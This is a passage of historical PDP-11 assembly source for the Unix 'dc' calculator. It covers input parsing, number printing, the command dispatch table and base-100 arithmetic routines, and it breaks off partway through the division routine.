/	input stream.  Numbers beginnig with 0 are
/	converted as octal.  Routine converts
/	up to next nonnumeric.
/
/
readin:
	clr	dp
	clr	dpt
	clr	r0
	jsr	pc,allocate
	mov	r1,-(sp)
	mov	strptr,r1
	jsr	pc,create
	jsr	pc,readc
1:
	cmpb	ch,$'0
	blt	3f
	cmpb	ch,$'9
	bgt	3f
	mov	ch,r0
	sub	$'0,r0
4:
	tst	dp
	beq	8f
	cmp	dpt,$99.
	beq	5f
	inc	dpt
8:
	mov	chptr,r1
	jsr	pc,create
	tst	r0
	beq	2f
	jsr	pc,putchar
2:	mov	r1,chptr
	mov	(sp),r3
	mov	inbas,r2
	jsr	pc,mul3
	mov	r1,(sp)
	mov	r3,r1
	jsr	pc,release
	mov	(sp),r3
	mov	chptr,r2
	jsr	pc,add3
	mov	r1,(sp)
	mov	r3,r1
	jsr	pc,release
5:
	jsr	pc,readc
	mov	r0,ch
	br	1b
3:
	cmpb	ch,$'A
	blt	1f
	cmpb	ch,$'F
	bgt	1f
	mov	ch,r0
	sub	$67,r0
	br	4b
1:
	cmpb	ch,$134		/backslash
	bne	1f
	jsr	pc,readc
	br	5b
1:
	cmpb	ch,$'.
	bne	1f
	tst	dp
	bne	1f
	inc	dp
	clr	dpt
	br	5b
1:
	mov	r0,savec
/
/	scale up or down
2:
	tst	dp
	bne	1f
	mov	(sp)+,r1
	clr	r0
	jsr	pc,putchar
	rts	pc
1:
	mov	(sp),r1
	jsr	pc,scale
	mov	dpt,r0
	jsr	pc,putchar
	tst	(sp)+
	rts	pc
/
.bss
dp:	.=.+2
dpt:	.=.+2
.text
/
scale:
	mov	dpt,r2
	jsr	pc,add0
	mov	r1,-(sp)
	mov	$1,r0
	jsr	pc,allocate
	mov	dpt,r0
	jsr	pc,putchar
	mov	r1,r3
	mov	inbas,r2
	jsr	pc,exp3
	mov	r1,-(sp)
	mov	r3,r1
	jsr	pc,release
	mov	(sp)+,r2
	mov	(sp)+,r3
	jsr	pc,div3
	mov	r1,-(sp)
	mov	r2,r1
	jsr	pc,release
	mov	r3,r1
	jsr	pc,release
	mov	r4,r1
	jsr	pc,release
	mov	(sp)+,r1
	rts	pc
/
/	routine to read another character from the input
/	stream.  If the caller does not want the character,
/	it is to be placed in the cell savec.
/	The routine exits to the system on end of file.
/	Character is returned in r0.
/
/	jsr	pc,readc
/	movb	r0,...
/
/
readc:
	tst	savec
	beq	1f
	movb	savec,r0
	bic	$177400,r0
	clr	savec
	rts	pc
1:
	tst	*readptr
	bne	1f
2:	mov	source,r0
	sys	read; ch; 1
	bes	eof
	tst	r0
	beq	eof
	movb	ch,r0
	bic	$177400,r0
	rts	pc
1:
	mov	r1,-(sp)
	mov	*readptr,r1
	jsr	pc,getchar
	bes	eof1
	bic	$177400,r0
	mov	r0,ch
	mov	(sp)+,r1
	rts	pc
/
eof:
	tst	source
	beq	1f
	clr	source
	br	2b
1:
	sys	exit
/
eof1:
	mov	*readptr,r1
	beq	2f
	jsr	pc,release
2:
	sub	$2,readptr
	mov	(sp)+,r1
	jmp	readc
/
/
/	case p for print
/
case160:
	cmp	r5,$pdl
	jeq	eh
	jsr	pc,in160
	jmp	loop
/
/
in160:
/	mov	$1,r0
/	sys	write; sphdr; 4
	br	1f
/
sphdr:	<    >
	.even
/
1:	cmp	r5,$pdl
	bne	1f
	mov	$1,r0
	sys	write; qm; 1
	mov	$1,r0
	sys	write; nl; 1
	rts	pc
/
/	do the conversion
/
1:
	mov	-2(r5),r1
	jsr	pc,printf
	rts	pc
/
/
/	case f for print the stack
/
case146:
	mov	r5,-(sp)
1:
	cmp	r5,$pdl
	beq	2f
1:
	jsr	pc,in160
	jsr	pc,pop
	cmp	r5,$pdl
	bne	1b
2:
	mov	$stable-2,r2
1:
	tst	(r2)+
	cmp	r2,$stable+254.
	bhi	1f
/
	mov	(r2),r3
	beq	1b
	movb	$'0,7f+3
	mov	r2,r0
	sub	$stable,r0
	asr	r0
	movb	r0,7f+1
3:
	mov	$1,r0
	sys	write; 7f; 8f-7f
.data
7:	<" (0)">
8:	.even
.text
	mov	2(r3),r1
	jsr	pc,printf
	tst	(r3)
	beq	1b
	incb	7b+3
	mov	(r3),r3
	br	3b
1:
	mov	(sp)+,r5
	jbr	loop
/
/
/	routine to convert to decimal and print the
/	top element of the stack.
/
/	jsr	pc,printf
/
/
printf:
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,-(sp)
	clr	-(sp)
	jsr	pc,rewind
2:
	jsr	pc,getchar
	bes	2f
	cmp	r0,$143
	blos	2b
	cmp	r0,$-1
	beq	2b
	bis	$1,(sp)
	br	2b
2:
	tst	(sp)+
	beq	2f
	jsr	pc,length
	mov	r0,0f
	mov	a(r1),3f
	mov	$1,r0
	sys	0; 9f
.data
9:
	sys	write; 3:.=.+2; 0:.=.+2
.text
	jbr	prout
2:
	jsr	pc,fsfile
	jsr	pc,backspace
	bec	1f
	mov	$1,r0
	sys	write; asczero; 1
	jbr	prout
1:
	jsr	pc,length
	mov	r1,-(sp)
	jsr	pc,allocate
	mov	(sp),r0
	mov	r1,(sp)
	jsr	pc,move
	mov	ll,count
/	inc	count
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,savk
	dec	w(r1)
	jsr	pc,backspace
	cmpb	r0,$-1
	bne	2f
	mov	basptr,r1
	jsr	pc,fsfile
	jsr	pc,backspace
	cmp	r0,$-1
	beq	2f
	mov	(sp),r1
	jsr	pc,chsign
	mov	$'-,ch
	jsr	pc,wrchar
	br	1f
2:
/	mov	$' ,ch
/	jsr	pc,wrchar
1:
	mov	strptr,r1
	jsr	pc,create
	mov	basptr,r1
	jsr	pc,length
	cmp	r0,$1
	jlo	dingout
	bne	1f
	jsr	pc,rewind
	jsr	pc,getchar
	cmp	r0,$1.
	jeq	unout
	cmp	r0,$-1
	jeq	dingout
	cmp	r0,$10.
	jeq	tenout
1:
	mov	log10,r1
	mul	savk,r1
	clr	r0
	div	logo,r0
	mov	r0,dout
	clr	ct
1:
	mov	(sp),r3
	mov	savk,r2
	jsr	pc,getdec
	mov	r1,decimal
	clr	dflg
	mov	(sp),r1
	mov	savk,r2
	jsr	pc,removc
	mov	r1,(sp)
1:
	mov	(sp),r3
	mov	basptr,r2
	jsr	pc,div3
	mov	r1,r2
	mov	(sp),r1
	jsr	pc,release
	mov	r2,(sp)
	mov	r4,r1
	jsr	pc,*outdit
	mov	(sp),r1
	jsr	pc,length
	bne	1b
/
	mov	strptr,r1
	jsr	pc,fsfile
1:
	jsr	pc,backspace
	bes	1f
	mov	r0,ch
	jsr	pc,wrchar
	br	1b
1:
	mov	(sp)+,r1
	jsr	pc,release
	tst	savk
	bne	1f
	mov	decimal,r1
	jsr	pc,release
	br	prout
1:
	mov	dot,ch
	jsr	pc,wrchar
	mov	strptr,r1
	jsr	pc,create
	mov	decimal,-(sp)
	inc	dflg
1:
	mov	(sp),r3
	mov	basptr,r2
	jsr	pc,mul3
	mov	r1,(sp)
	mov	r3,r1
	jsr	pc,release
	mov	(sp),r3
	mov	savk,r2
	jsr	pc,getdec
	mov	r1,(sp)
	mov	r3,r1
	mov	savk,r2
	jsr	pc,removc
	jsr	pc,*outdit
	mov	strptr,r1
	inc	ct
	cmp	ct,dout
	blo	1b
	mov	(sp)+,r1
	jsr	pc,release
	mov	strptr,r1
	jsr	pc,rewind
1:
	jsr	pc,getchar
	bes	1f
	mov	r0,ch
	jsr	pc,wrchar
	br	1b
1:
/
/	cleanup, print new line and return
/
prout:	mov	$1,r0
	sys	write; nl; 1
	mov	(sp)+,r0
	mov	(sp)+,r1
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	(sp)+,r4
	rts	pc
/
/
/
/	r2 = count
/	r3 = pointer (not released)
/
.bss
dflg:	.=.+2
dout:	.=.+2
logo:	.=.+2
log10:	.=.+2
decimal:	.=.+2
.text
getdec:
	mov	r3,-(sp)
	mov	r3,r1
	jsr	pc,rewind
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,-(sp)
1:
	cmp	r2,$1
	blt	1f
	mov	2(sp),r1
	jsr	pc,getchar
	mov	(sp),r1
	jsr	pc,putchar
	mov	r1,(sp)
	sub	$2,r2
	br	1b
1:
	tst	r2
	beq	1f
	mov	tenptr,r2
	mov	(sp),r3
	jsr	pc,mul3
	mov	r1,(sp)
	mov	r3,r1
	jsr	pc,length
	jsr	pc,release
	mov	r0,r3
	jsr	pc,allocate
	mov	r1,-(sp)
	mov	2(sp),r1
	jsr	pc,rewind
2:
	tst	r3
	beq	2f
	jsr	pc,getchar
	mov	(sp),r1
	jsr	pc,putchar
	mov	r1,(sp)
	dec	r3
	mov	2(sp),r1
	br	2b
2:
	clr	r0
	mov	(sp),r1
	jsr	pc,putchar
	mov	2(sp),r1
	jsr	pc,release
	mov	(sp),r3
	mov	tenptr,r2
	jsr	pc,div3
	mov	r1,(sp)
	mov	r3,r1
	jsr	pc,release
	mov	r4,r1
	jsr	pc,release
	mov	(sp)+,r1
	tst	(sp)+
	mov	(sp)+,r3
	rts	pc
1:
	mov	(sp)+,r1
	mov	(sp)+,r3
	rts	pc
tenout:
	mov	savk,ct
	mov	$2,r0
	jsr	pc,allocate
	mov	r1,-(sp)
	mov	2(sp),r1
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,r3
	clr	r2
	dvd	$10.,r2
	beq	1f
3:
	add	$60,r2
	mov	r2,r0
	mov	(sp),r1
	jsr	pc,putchar
	mov	r1,(sp)
1:
	mov	(sp),r1
	add	$60,r3
	mov	r3,r0
	jsr	pc,putchar
	mov	2(sp),r1
1:
	jsr	pc,backspace
	bec	2f
	mov	(sp),r1
	jsr	pc,length
	cmp	r0,ct
	beq	4f
	blo	5f
	sub	ct,r0
	mov	r0,ct
1:
	jsr	pc,getchar
	mov	r0,ch
	jsr	pc,wrchar
	dec	ct
	bne	1b
	jsr	pc,getchar
	bes	6f
	jsr	pc,backspace
4:
	movb	dot,ch
	jsr	pc,wrchar
1:
	jsr	pc,getchar
	bes	1f
	mov	r0,ch
	jsr	pc,wrchar
	br	1b
5:
	sub	r0,ct
	movb	dot,ch
	jsr	pc,wrchar
	mov	$60,ch
5:
	jsr	pc,wrchar
	dec	ct
	bne	5b
	br	1b
1:
6:
	mov	(sp)+,r1
	jsr	pc,release
	mov	(sp)+,r1
	jsr	pc,release
	jbr	prout
2:
	mov	r0,r3
	clr	r2
	dvd	$10.,r2
	br	3b
dot:	<.>
	.even
ct:	.=.+2
/
/
dingout:
	clr	-(sp)
	br	1f
unout:
	mov	$1,-(sp)
1:
	mov	2(sp),r1
	mov	savk,r2
	jsr	pc,removc
	mov	r1,2(sp)
	mov	strptr,r1
	jsr	pc,create
	mov	$-1,r0
	jsr	pc,putchar
	mov	r1,r3
1:
	mov	2(sp),r1
	jsr	pc,length
	beq	1f
	mov	r1,r2
	jsr	pc,add3
	mov	r1,2(sp)
	mov	r2,r1
	jsr	pc,release
	mov	$1,r0
	tst	(sp)
	beq	2f
	mov	$'1,ch
	jsr	pc,wrchar
	br	1b
2:
	tst	delflag
	jne	in177
	sys	write; ding; 3
	br	1b
1:
	tst	(sp)+
	mov	(sp)+,r1
	jsr	pc,release
	jmp	prout
/
ding:	<>			/<bell prefix form feed>
sp5:	<\\\n     >
minus:	<->
one:	<1>
	.even
.bss
count:	.=.+2
.text
/
bigout:
	mov	r1,-(sp)	/big digit
	tst	dflg
	beq	1f
	clr	r0
	jsr	pc,allocate
	mov	r1,tptr
1:
	mov	strptr,r1
	jsr	pc,length
	add	fw,r0
	dec	r0
	mov	r0,-(sp)	/end of field
	clr	-(sp)		/negative
	mov	4(sp),r1
	jsr	pc,length
	bne	2f
	mov	$'0,r0
	tst	dflg
	beq	3f
	mov	tptr,r1
	jsr	pc,putchar
	mov	r1,tptr
	br	1f
3:
	mov	strptr,r1
	jsr	pc,putchar
	br	1f
2:
	mov	4(sp),r1	/digit
	jsr	pc,fsfile
	jsr	pc,backspace
	bpl	2f
	mov	$1,(sp)		/negative
	jsr	pc,chsign
2:
	mov	4(sp),r3	/digit
	mov	r3,r1
	jsr	pc,length
	beq	1f
	mov	tenptr,r2
	jsr	pc,div3
	mov	r1,4(sp)	/digit
	mov	r3,r1
	jsr	pc,release
	mov	r4,r1
	jsr	pc,rewind
	jsr	pc,getchar
	jsr	pc,release
	add	$'0,r0
	tst	dflg
	beq	3f
	mov	tptr,r1
	jsr	pc,putchar
	mov	r1,tptr
	br	2b
3:
	mov	strptr,r1
	jsr	pc,putchar
	br	2b
1:
	tst	dflg
	beq	4f
	mov	tptr,r1
	jsr	pc,length
	cmp	r0,fw1
	bhis	2f
	mov	fw1,r1
	sub	r0,r1
	mov	r1,-(sp)
	mov	strptr,r1
3:
	mov	$'0,r0
	jsr	pc,putchar
	dec	(sp)
	bne	3b
	tst	(sp)+
2:
	mov	tptr,r1
	jsr	pc,fsfile
2:
	mov	tptr,r1
	jsr	pc,backspace
	bes	2f
	mov	strptr,r1
	jsr	pc,putchar
	br	2b
2:
	mov	tptr,r1
	jsr	pc,release
	br	1f
4:
	mov	strptr,r1
	jsr	pc,length
	cmp	r0,2(sp)	/end of field
	bhis	1f
	mov	$'0,r0
	jsr	pc,putchar
	br	1b
1:
	tst	(sp)		/negative
	beq	1f
	mov	$'-,r0
	mov	strptr,r1
	dec	w(r1)
	jsr	pc,putchar
1:
	mov	strptr,r1
	mov	$' ,r0
	jsr	pc,putchar
	tst	(sp)+
	tst	(sp)+
	mov	(sp)+,r1
	jsr	pc,release
	rts	pc
/
.bss
tptr:	.=.+2
tenptr:	.=.+2
.text
/
/
/
hexout:
	mov	r1,-(sp)
	jsr	pc,rewind
	jsr	pc,getchar
	cmp	r0,$16.
	blo	1f
	jmp	err
1:
	add	$60,r0
	cmp	r0,$'9
	blos	2f
	add	$'A-'9-1,r0
2:
	mov	strptr,r1
	jsr	pc,putchar
	mov	(sp)+,r1
	jsr	pc,release
	rts	pc
/
/
wrchar:
	tst	delflag
	jne	in177
	mov	$1,r0
	tst	count
	bne	7f
	sys	write; sp5; 2
	mov	ll,count
	mov	$1,r0
7:
	dec	count
	sys	write; ch; 1
	rts	pc
/
/
/	case P for print an ascii string
/
/
case120:
	jsr	pc,pop
	jes	eh
	jsr	pc,length
	mov	r0,0f
	mov	a(r1),3f
	mov	$1,r0
	sys	0; 9f
	jsr	pc,release
	jmp	loop
.data
9:	sys	write; 3:.=.+2; 0:.=.+2
.text
/
/
/	here for unimplemented stuff
/
junk:
	movb	r0,1f
	mov	$1,r0
	sys	write; 1f; 2f-1f
	jmp	loop
.data
1:	<0 not in switch.\n>
2:	.even
.text
/
/
/
/	routine to place one word onto the pushdown list
/	Error exit to system on overflow.
/
/
push:
	mov	r1,(r5)+
	cmp	r5,$pdltop
	bhis	pdlout
	rts	pc
/
pdlout:
	mov	$1,r0
	sys	write; 1f; 2f-1f
	jmp	reset
1:	<Out of pushdown.\n>
2:	.even
/
/
/	routine to remove one word from the pushdown list
/	carry bit set on empty stack
/
/
/	jsr	pc,pop
/
pop:
	cmp	r5,$pdl
	bhi	1f
	clr	r1
	sec
	rts	pc
1:	mov	-(r5),r1
	clc
	rts	pc
/
/
/
/
.data
outdit:	hexout
.bss
source: .=.+2
savec:	.=.+2
ch:	.=.+2
.text
nl:	<\n>
asczero:	<0>
qm:	<?\n>
	.even
/
.bss
chptr:	.=.+2
strptr:	.=.+2
basptr:	.=.+2
scalptr:	.=.+2
errstack:.=.+2
/
stable:	.=.+512.
.text
casetab:
	case012; 012	/nl
	loop;    040	/sp
	case041; 041	/!
	case045; 045	/%
	case052; 052	/*
	case053; 053	/+
	case055; 055	/-
	case060; 056	/.
	case057; 057	//
	case060; 060	/0
	case060; 061	/1
	case060; 062	/2
	case060; 063	/3
	case060; 064	/4
	case060; 065	/5
	case060; 066	/6
	case060; 067	/7
	case060; 070	/8
	case060; 071	/9
	case072; 072	/:
	case073; 073	/;
	case074; 074	/<
	case075; 075	/=
	case076; 076	/>
	case077; 077	/?
	case060; 101	/A
	case060; 102	/B
	case060; 103	/C
	case060; 104	/D
	case060; 105	/E
	case060; 106	/F
	case111; 111	/I
	case113; 113	/K
	case114; 114	/L
	case117; 117	/O
	case120; 120	/P
	case121; 121	/Q
	case123; 123	/S
	case166;  126	/V
	case170; 130	/X
	case172; 132	/Z
	case133; 133	/[
	case136; 136	/^
	case137; 137	/_
	case143; 143	/c
	case144; 144	/d
	case146; 146	/f
	case151; 151	/i
	case153; 153	/k
	case154; 154	/l
	case157; 157	/o
	case160; 160	/p
	case161; 161	/q
	case163; 163	/s
	case166; 166	/v
	case170; 170	/x
	case172; 172	/z
	0;0
/
.bss
pdl:	.=.+100.
pdltop:
.text

reset:
	clr	r0
	sys	seek; 0; 2
1:
	clr	r0
	sys	read; rathole; 1
	bes	1f
	tst	r0
	beq	1f
	cmpb	rathole,$'q
	bne	1b
1:
	sys	exit
.bss
rathole:	.=.+2
.text
-- /usr/source/s1/dc2.s mode=0110664 uid=3 gid=3 atime=174922744 mtime=169260570 --
/
/
/	routine to add the two centennial numbers
/	pointed to by r2 and r3.
/	a pointer to the result is returned in r1
/	r2 and r3 are preserved
/
/	mov	ptr1,r2
/	mov	ptr2,r3
/	jsr	pc,add3
/	mov	r1,...
/
add3:	mov	r0,-(sp)
	mov	r4,-(sp)
	mov	r5,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
/
/	allocate a new string whose length is
/	the max of the two addends.
/
	mov	w(r2),r0
	sub	a(r2),r0
	mov	w(r3),r4
	sub	a(r3),r4
	cmp	r0,r4
	bgt	1f
	mov	r4,r0
1:	mov	r0,r4
	jsr	pc,allocate
	mov	r1,-(sp)
/
/	get everything ready
/
	mov	2(sp),r1
	jsr	pc,rewind
	mov	4(sp),r1
	jsr	pc,rewind
	clr	carry
/
/	now add them
/
2:	dec	r4
	blt	3f
	mov	2(sp),r1	/r2
	jsr	pc,getchar
	mov	r0,r5
	mov	4(sp),r1	/r3
	jsr	pc,getchar
	add	r5,r0
	add	carry,r0
	clr	carry
	cmp	r0,$100.
	blt	1f
	sub	$100.,r0
	mov	$1,carry
1:
	tstb	r0
	bpl	1f
	add	$100.,r0
	mov	$-1,carry
1:	mov	(sp),r1		/r1
	jsr	pc,putchar
	br	2b
/
/	perhaps there is an extra digit
/
3:	mov	carry,r0
	beq	2f
	mov	(sp),r1		/r1
	jsr	pc,putchar
/
/	strip leading zeros
/
2:
	jsr	pc,fsfile
2:	jsr	pc,backspace
	bes	2f
	beq	2b
	inc	r(r1)
2:	mov	r(r1),w(r1)
/
/	strip leading 99's
/
	jsr	pc,fsfile
	jsr	pc,backspace
	cmpb	r0,$-1
	bne	1f
2:
	jsr	pc,backspace
	bes	2f
	cmpb	r0,$99.
	beq	2b
	jsr	pc,getchar
2:
	mov	$-1,r0
	jsr	pc,alterchar
	mov	r(r1),w(r1)
/
/	restore and return
/
1:
	mov	(sp)+,r1
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	(sp)+,r5
	mov	(sp)+,r4
	mov	(sp)+,r0
	rts	pc
/
.bss
carry:	.=.+2
.text
/
/
/	routine to change the sign of the centennial number
/	pointed to by r1.
/	negative numbers are stored in 100's complement form with
/	-1 as the high order digit; the second digit is not 99.
/
/	mov	...,r1
/	jsr	pc,chsign
/
chsign:
	mov	r1,-(sp)
	mov	r0,-(sp)
	jsr	pc,rewind
	clr	chcarry
/
1:
	jsr	pc,lookchar
	bes	1f
	negb	r0
	sub	chcarry,r0
	mov	$1,chcarry
	add	$100.,r0
	cmpb	$100.,r0
	bgt	2f
	sub	$100.,r0
	clr	chcarry
2:
	jsr	pc,alterchar
	br	1b
/
1:
	clr	r0
	sub	chcarry,r0
	beq	2f
	jsr	pc,putchar
	jsr	pc,fsfile
	jsr	pc,backspace
	jsr	pc,backspace
	cmp	r0,$99.
	bne	1f
	mov	r(r1),w(r1)
	mov	$-1,r0
	jsr	pc,putchar
	br	1f
/
2:
	jsr	pc,fsfile
	jsr	pc,backspace
	bne	1f
	mov	r(r1),w(r1)
/
1:
	mov	(sp)+,r0
	mov	(sp)+,r1
	rts	pc
/
.bss
chcarry: .=.+2
.text
/
/
/
/
/	routine to multiply the two centennial numbers
/	pointed to by r2 and r3.
/	a pointer to the result is returned in r1
/	r2 and r3 are preserved
/
/	mov	ptr1,r2
/	mov	ptr2,r3
/	jsr	pc,mul3
/	mov	r1,...
/
/	save registers and make space for temps
/
mul3:
	mov	r5,-(sp)
	mov	r3,-(sp)	/arg2
	mov	r2,-(sp)	/arg1
	mov	r0,-(sp)
	tst	-(sp)		/result
	tst	-(sp)		/arg1
	tst	-(sp)		/arg2
	tst	-(sp)		/carry
/
/	compute sign of result and make args positive
/
	clr	outsign
	mov	r2,r1
	jsr	pc,fsfile
	jsr	pc,backspace
	bmi	2f
	mov	r2,4(sp)	/arg1
	br	1f
2:
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,4(sp)
	mov r2,r0
	jsr	pc,move
	jsr	pc,chsign
	com	outsign
1:
	mov	r3,r1
	jsr	pc,fsfile
	jsr	pc,backspace
	bmi	2f
	mov	r3,2(sp)	/arg2
	br	1f
2:
	mov	r3,r1
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,2(sp)
	mov	r3,r0
	jsr	pc,move
	jsr	pc,chsign
	com	outsign
1:
/
/	compute the length of the result and
/	allocate space for it
/
	mov	w(r2),r0
	sub	a(r2),r0
	add	w(r3),r0
	sub	a(r3),r0
	jsr	pc,allocate
	jsr	pc,zero
	mov	r1,6(sp)	/result
	clr	offset
	mov	2(sp),r1	/arg2
	jsr	pc,rewind
/
/	work on next digit of arg2, starting over on arg1
/
1:	mov	4(sp),r1	/arg1
	jsr	pc,rewind
	mov	2(sp),r1	/arg2
	jsr	pc,getchar
	bes	3f
	mov	r0,r2
	mov	6(sp),r1	/result
	jsr	pc,rewind
	add	offset,r(r1)
	clr	0(sp)		/carry
/
/	work on next digit of arg3
/	form the product of the two digits,
/	add to what is already there and add in old carry
/	to generate new dit and new carry.
/
2:	mov	4(sp),r1	/arg1
	jsr	pc,getchar
	bes	2f
	mov	r0,r3
	mpy	r2,r3
	add	(sp),r3		/carry
	mov	6(sp),r1	/result
	jsr	pc,lookchar
	add	r0,r3
	mov	r3,r1
	clr	r0
	dvd	$100.,r0
	mov	r0,(sp)		/carry
	mov	r1,r0
	mov	6(sp),r1	/result
	jsr	pc,alterchar
	br	2b
/
2:
	inc	offset
	tst	(sp)		/carry
	beq	1b
	mov	6(sp),r1	/result
	jsr	pc,lookchar
	add	(sp),r0		/carry
	jsr	pc,alterchar
	br	1b
/
3:
/
/	change sign of result if necessary
/
	tst	outsign
	bpl	1f
	mov	6(sp),r1	/result
	jsr	pc,chsign
/
/	release dregs if necessary
/
1:
	cmp	2(sp),14(sp)
	beq	1f
	mov	2(sp),r1
	jsr	pc,release
1:
	cmp	4(sp),12(sp)
	beq	1f
	mov	4(sp),r1
	jsr	pc,release
1:
/
/	restore registers and return
/
	tst	(sp)+
	tst	(sp)+
	tst	(sp)+
	mov	(sp)+,r1
	mov	(sp)+,r0
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	(sp)+,r5
	rts	pc
/
.bss
outsign: .=.+2
offset:	.=.+2
k:	.=.+2
kptr:	.=.+2
.text
/
sqrt:
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	r2,-(sp)
	mov	r0,-(sp)
/
/	check for zero or negative
/
	mov	w(r1),r2
	sub	a(r1),r2
/
/	look at the top one or two digits
/
	mov	r1,r3
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,r4
	bit	$1,r2
	bne	2f
	mov	r4,r1
	mul	$100.,r1
	mov	r1,r4
	mov	r3,r1
	jsr	pc,backspace
	add	r0,r4
2:
/
/	allocate space for result
/
	inc	r2
	asr	r2
	mov	r2,r0
	jsr	pc,allocate
	jsr	pc,zero
	mov	r2,r0
	jsr	pc,seekchar
	mov	r1,r2
/
/	get high order digit of arg and square root it
/
	mov	$1,r0
2:	sub	r0,r4
	blt	2f
	add	$2,r0
	br	2b
2:	inc	r0
	asr	r0
	mov	r0,r4
	mov	r2,r1
	jsr	pc,fsfile
	jsr	pc,backspace
	cmp	r4,$100.
	blt	1f
	sub	$100.,r4
	mov	r4,r0
	jsr	pc,alterchar
	mov	$1,r0
	jsr	pc,putchar
	br	2f
1:
	mov	r4,r0
	jsr	pc,alterchar
2:
	mov	r1,-(sp)
	mov	r3,-(sp)
/
/	get successive approx. from Newton
/
1:	mov	(sp),r3		/arg
	mov	2(sp),r2	/approx
	jsr	pc,div3
	mov	r1,r3
	jsr	pc,add3
	mov	r1,-(sp)
	mov	r3,r1
	jsr	pc,release
	mov	r4,r1
	jsr	pc,release
	mov	(sp)+,r1
	mov	sqtemp,r2
	mov	r1,r3
	jsr	pc,div3
	mov	r1,-(sp)
	mov	r3,r1
	jsr	pc,release
	mov	r4,r1
	jsr	pc,release
	mov	(sp)+,r3
	mov	2(sp),r1
	jsr	pc,length
	jsr	pc,allocate
	mov	2(sp),r0
	jsr	pc,move
	jsr	pc,chsign
	mov	r1,r2
	jsr	pc,add3
	jsr	pc,fsfile
	jsr	pc,backspace
	jsr	pc,release
	mov	r2,r1
	jsr	pc,release
	tst	r0
	bpl	2f
/
/	loop if new < old
	mov	2(sp),r1
	jsr	pc,release
	mov	r3,2(sp)
	br	1b
/
2:
	mov	r3,r1
	jsr	pc,release
	mov	(sp)+,r1
	jsr	pc,release
	mov	(sp)+,r1
	mov	(sp)+,r0
	mov	(sp)+,r2
	mov	(sp)+,r3
	mov	(sp)+,r4
	rts	pc
-- /usr/source/s1/dc3.s mode=0110664 uid=3 gid=3 atime=174922744 mtime=169260571 --
/
/
/	routine to divide the two centennial numbers pointed
/	to by r2 (the divisor) and r3 (the dividend).
/	A pointer to the result is returned in r1.  All other
/	registers are preserved.  If the divisor is zero, zero
/	is returned and the carry bit is set.
/	Remainder is returned in r4 and has the sign
/	of the dividend.
/
/
/	mov	divisor,r2
/	mov	dividend,r3
/	jsr	pc,div3
/	mov	r1,result
/	mov	r4,remainder
/
/
div3:
	mov	r5,-(sp)
	mov	r3,-(sp)	/dividend
	mov	r2,-(sp)	/divisor
	mov	r0,-(sp)
	tst	-(sp)	/result
/
/	allocate space for result; allocate temps if necessary
/
	clr	r0
	jsr	pc,allocate
	mov	r1,0(sp)	/result
/
/
/	check for divisor zero
/
	mov	4(sp),r2	/divisor
	mov	w(r2),r0
	sub	a(r2),r0
	bne	1f
	jmp	eh
1:
/
/	compute sign of result and make arguments positive
/
	clr	divsign
	mov	r2,r1
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,divisor
	mov	r2,r0
	jsr	pc,move
	jsr	pc,fsfile
	jsr	pc,backspace
	bpl	1f
2:
	jsr	pc,chsign
	mov	r1,divisor
	com	divsign
1:
	clr	remsign
	mov	r3,r1
	jsr	pc,length
	jsr	pc,allocate
	mov	r1,dividend
	mov	r3,r0
	jsr	pc,move
	jsr	pc,fsfile
	jsr	pc,backspace
	bpl	1f
2:
	jsr	pc,chsign
	mov	r1,dividend
	com	divsign
	com	remsign
1:
/
/
/	find out how many digits in the quotient result
/
1:
	mov	dividend,r2
	mov	divisor,r3
	mov	w(r2),r0
	sub	a(r2),r0
	add	a(r3),r0
	sub	w(r3),r0
	jlo	bugout
	mov	r0,divoffset
	mov	0(sp),r1	/result
	inc	r0
	jsr	pc,seekchar
	clr	r0
	mov	dividend,r1
	jsr	pc,putchar
/
/	load r5 with binary divisor for finding
/	trial quotient digits. If leading digit of
/	divisor is <10, it is scaled
/
	clr	magic
	mov	divisor,r1
	jsr	pc,fsfile
	jsr	pc,backspace
	mov	r0,r5
	cmp	r5,$10.
	bge	2f
	inc	magic
2:
	mpy	$100.,r5
	jsr	pc,backspace
	add	r0,r5
	tst	magic
	beq	2f
	mov	r5,r4
	mpy	$100.,r4
	jsr	pc,backspace
	add	r0,r5
	adc	r4
	asl	r5
	rol	r4
	dvd	$25.,r4
	mov	r4,r5
2:
/
/	compute trial quotient digit
/
1:
	mov	dividend,r1
	jsr	pc,fsfile
	jsr	pc,backspace
	bec 9f; 4; 9:
	mov	r0,r3
	mpy	$100.,r3
	mov	r3,r2
	jsr	pc,backspace
	add	r0,r2
	mpy	$100.,r2
	jsr	pc,backspace
	add	r0,r3
	adc	r2
	tst	divoffset
	bne	2f
	add	$1,r3
	adc	r2
2:
/
	tst	magic
	beq	3f
	ashc	$3,r2
3:
	mov	r5,r0
	tst	divoffset
	beq	2f
	inc	r0
2:
	dvd	r0,r2
	mov	r2,trial
/
/
/	multiply divisor by trial digit
/
	mov	divisor,r1
	jsr	pc,rewind
	jsr	pc,length
	inc	r0
	mov	divxyz,r1
	jsr	pc,rewind
	clr	-(sp)
2:
	mov	divisor,r1
	jsr	pc,getchar
	bes	2f
	mov	r0,r3
	mpy	trial,r3
	add	(sp),r3		/carry
	clr	r2
	dvd	$100.,r2
	mov	r2,(sp)		/carry
	mov	r3,r0
	mov	divxyz,r1
	jsr	pc,alterchar
	br	2b
2:
	mov	divxyz,r1
	mov	(sp)+,r0
	jsr	pc,alterchar
3:
/
/	and subtract from dividend
/
	jsr	pc,rewind
	mov	divoffset,r0
	mov	dividend,r1
	jsr	pc,seekchar
	clr	-(sp)
/
2:	mov	dividend,r1
	jsr	pc,lookchar
	bes	2f
	mov	r0,r2
/
	mov	divxyz,r1
	jsr	pc,getchar
	sub	r0,r2
	sub	(sp),r2
	clr	(sp)
	mov	r2,r0
	bpl	3f
	add	$100.,r0
	mov	$1.,(sp)
3:	mov	dividend,r1
	jsr	pc,alterchar
	br	2b
/
/	put away the quotient digit
